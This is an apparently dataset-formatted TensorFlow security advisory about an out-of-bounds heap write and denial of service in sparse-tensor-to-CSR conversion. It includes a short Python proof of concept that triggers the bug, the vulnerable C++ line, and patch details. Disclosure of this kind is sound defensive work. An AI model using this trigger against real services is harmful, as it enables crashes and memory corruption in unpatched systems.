{"description": "### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in converting sparse tensors to CSR Sparse matrices:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([0.0], dtype=np.float32)\ndense_shape = [0, 0]\n\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\nvalues_tensor = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/800346f2c03a27e182dd4fba48295f65e7790739/tensorflow/core/kernels/sparse/kernels.cc#L66) does a double redirection to access an element of an array allocated on the heap:\n\n```cc\ncsr_row_ptr(indices(i, 0) + 1) += 1;\n```\n                      \nIf the value at `indices(i, 0)` is such that `indices(i, 0) + 1` is outside the bounds of `csr_row_ptr`, this results in writing outside of bounds of heap allocated data.\n\n### Patches\nWe have patched the issue in GitHub commit [1e922ccdf6bf46a3a52641f99fd47d54c1decd13](https://github.com/tensorflow/tensorflow/commit/1e922ccdf6bf46a3a52641f99fd47d54c1decd13).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Heap buffer overflow via a CHECK-fail in converting sparse tensors to CSR Sparse matrices.", "Writing outside of bounds of heap allocated data."]}
